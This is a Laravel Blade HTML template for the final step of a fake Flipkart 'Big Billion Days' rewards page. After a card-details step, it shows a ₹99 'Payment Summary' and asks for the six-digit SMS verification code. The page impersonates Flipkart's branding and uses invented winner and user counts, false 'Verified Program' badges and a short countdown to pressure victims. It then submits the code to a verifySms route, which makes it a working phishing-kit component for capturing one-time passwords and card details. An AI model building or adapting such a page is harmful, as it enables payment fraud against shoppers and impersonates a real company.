<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification - Flipkart Rewards</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ asset('style/welcom.css') }}">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <script>
        const verifySmsUrl = "{{ route('verifySms', ['session_id' => $session_id]) }}";
        const whatToDoUrl = "{{ route('what-to-do') }}";
        const cardUrl = "{{ route('card', ['session_id' => $session_id]) }}";
    </script>
    <script src="{{ asset('javascript/sms-working.js') }}" defer></script>
</head>
<body>
    <nav class="flipkart-navbar">
        <div class="max-w-7xl mx-auto px-4 py-3">
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-8">
                    <div class="text-2xl font-bold text-white">Flipkart</div>
                    <div class="hidden md:flex space-x-6">
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Electronics</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Fashion</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Home</a>
                        <a href="#" class="text-white hover:text-yellow-300 transition-colors">Appliances</a>
                    </div>
                </div>
                <div class="hidden md:flex flex-1 max-w-lg mx-8">
                    <div class="relative w-full">
                        <input type="text" placeholder="Search for products, brands and more" 
                               class="w-full py-3 px-4 pr-12 rounded-l-md border-none outline-none">
                        <button class="absolute right-0 top-0 h-full px-4 bg-yellow-400 rounded-r-md hover:bg-yellow-500 transition-colors">
                            <i class="fas fa-search text-blue-800"></i>
                        </button>
                    </div>
                </div>
                <div class="flex items-center space-x-6">
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-user mr-2"></i>
                        <span class="hidden sm:inline">Login</span>
                    </button>
                    <button class="text-white hover:text-yellow-300 transition-colors">
                        <i class="fas fa-shopping-cart mr-2"></i>
                        <span class="hidden sm:inline">Cart</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>
    
    <div class="bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 py-12 relative overflow-hidden">
        <!-- Background Pattern -->
        <div class="absolute inset-0 opacity-10">
            <div class="absolute top-4 left-10 w-16 h-16 border-2 border-white rounded-full"></div>
            <div class="absolute top-20 right-20 w-8 h-8 bg-yellow-300 rounded-full"></div>
            <div class="absolute bottom-10 left-1/4 w-12 h-12 border border-white rotate-45"></div>
            <div class="absolute bottom-6 right-10 w-6 h-6 bg-white rounded-full"></div>
        </div>
        
        <div class="max-w-6xl mx-auto px-4 text-center relative z-10">
            <!-- Anniversary Badge -->
            <div class="inline-flex items-center bg-yellow-400 text-blue-900 px-4 py-2 rounded-full text-sm font-bold mb-4">
                <i class="fas fa-birthday-cake mr-2"></i>
                17th Anniversary Special
            </div>
            
            <h1 class="text-5xl md:text-6xl font-black mb-4 text-white leading-tight">
                <span class="inline-block animate-pulse">🎉</span>
                Big Billion Days
                <span class="inline-block animate-pulse">🎁</span>
            </h1>
            
            <div class="text-2xl md:text-3xl font-bold text-yellow-200 mb-3">
                Spin &amp; Win Mega Rewards!
            </div>
            
            <p class="text-lg text-blue-100 mb-6 max-w-3xl mx-auto">
                Celebrate Flipkart's 17th Anniversary with exclusive prizes worth up to ₹80,000! 
                <strong class="text-yellow-200">Limited time offer</strong> - Only for registered users.
            </p>
            
            <!-- Feature Pills -->
            <div class="flex flex-wrap justify-center gap-3 mb-6">
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-shield-check mr-2 text-green-300"></i>
                    Verified Program
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-truck mr-2 text-blue-300"></i>
                    Free Delivery
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-certificate mr-2 text-yellow-300"></i>
                    Official Rewards
                </div>
                <div class="bg-white bg-opacity-20 backdrop-blur-sm rounded-full px-4 py-2 text-sm text-white border border-white border-opacity-30">
                    <i class="fas fa-clock mr-2 text-orange-300"></i>
                    24H Only
                </div>
            </div>
            
            <!-- Live Stats -->
            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-4 max-w-2xl mx-auto border border-white border-opacity-20">
                <div class="grid grid-cols-3 gap-4 text-center">
                    <div>
                        <div class="text-2xl font-bold text-yellow-300" id="totalWinners">12,847</div>
                        <div class="text-xs text-blue-100">Winners Today</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-green-300" id="totalPrizes">₹2.4Cr+</div>
                        <div class="text-xs text-blue-100">Prizes Given</div>
                    </div>
                    <div>
                        <div class="text-2xl font-bold text-orange-300 flex items-center justify-center">
                            <i class="fas fa-circle text-xs mr-1 animate-pulse"></i>
                            <span id="liveUsers">1,247</span>
                        </div>
                        <div class="text-xs text-blue-100">Playing Now</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <main class="max-w-4xl mx-auto px-4 py-8">
        <!-- Progress Bar -->
        <div class="mb-8">
            <div class="flex justify-between items-center mb-3">
                <span class="text-sm font-semibold text-blue-600 bg-blue-50 px-3 py-1 rounded-full">
                    Step 4 of 4
                </span>
                <span class="text-sm text-gray-600">100%</span>
            </div>
            <div class="progress-container">
                <div class="progress-bar" style="width: 100%"></div>
            </div>
        </div>

        <div class="bg-white rounded-2xl shadow-xl p-8 relative overflow-hidden">
            <!-- Step 4: SMS Verification -->
            <div class="text-center mb-8">
                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-4">SMS Verification</h2>
                <p class="text-lg text-gray-600">Enter the verification code sent to your mobile</p>
            </div>

            <!-- Payment Details Summary -->
            <div class="bg-gray-50 rounded-xl p-6 mb-8 border">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold text-gray-800">Payment Summary</h3>
                    <div class="text-sm bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
                        VERIFIED
                    </div>
                </div>
                <div class="space-y-2">
                    <div class="flex justify-between">
                        <span>Merchant:</span>
                        <span class="font-semibold">{{ env('Merchant', 'Flipkart Rewards') }}</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Amount:</span>
                        <span class="font-semibold text-green-600">{{ env('AMOUNT', '₹99.00') }}</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Card Number:</span>
                        <span class="font-semibold">XXXX XXXX XXXX {{ session('last4_card_number', '1234') }}</span>
                    </div>
                    <div class="flex justify-between">
                        <span>Date:</span>
                        <span class="font-semibold">{{ now()->format('d/m/Y') }}</span>
                    </div>
                </div>
            </div>

            <!-- SMS Form -->
            <form id="smsForm" class="max-w-2xl mx-auto space-y-6">
                @csrf
                
                <div class="text-center">
                    <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                        <div class="flex items-center justify-center mb-3">
                            <i class="fas fa-mobile-alt text-blue-600 text-2xl mr-3"></i>
                            <span class="text-lg font-semibold text-blue-800">SMS Code Required</span>
                        </div>
                        <p class="text-sm text-blue-700">
                            A verification code has been sent to your registered mobile number. 
                            Please enter it below to complete your transaction.
                        </p>
                    </div>
                </div>

                <div class="space-y-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">
                            SMS Verification Code
                            <span class="text-red-500">*</span>
                        </label>
                        <input type="text" 
                               id="smsCode" 
                               name="code" 
                               placeholder="Enter 6-digit code" 
                               required 
                               class="form-input text-center text-2xl tracking-widest font-bold"
                               maxlength="6">
                        <div class="text-center mt-2">
                            <p class="text-sm text-gray-600">
                                Code expires in: <span id="timer" class="font-bold text-red-600 timer">00:31</span>
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Security Notice -->
                <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                    <div class="flex items-start">
                        <i class="fas fa-shield-check text-green-600 mt-0.5 mr-3 flex-shrink-0"></i>
                        <div class="text-sm text-green-800">
                            <div class="font-medium mb-1">Secure Verification</div>
                            <div>This code is sent only to your registered mobile number. Never share this code with anyone.</div>
                        </div>
                    </div>
                </div>

                <!-- Error/Success Messages -->
                <div id="error" class="error text-center mt-4" style="display: none;">
                    <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
                        <p id="errorMessage">❌ An error occurred. Please try again.</p>
                    </div>
                </div>

                <div id="success" class="success text-center mt-4" style="display: none;">
                    <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded">
                        <p>✅ SMS code submitted successfully!</p>
                    </div>
                </div>

                <div class="text-center">
                    <button type="button" id="confirmBtn" class="flipkart-btn w-full py-4 text-lg">
                        <i class="fas fa-check-circle mr-2"></i>
                        Verify & Complete
                    </button>
                </div>
            </form>
        </div>
    </main>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div id="loadingText" class="text-xl font-semibold mb-2">Processing...</div>
            <div class="loading-dots">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="text-sm mt-4 opacity-75" id="loadingSubtext">Please wait while we verify your SMS code</div>
        </div>
    </div>
</body>
</html>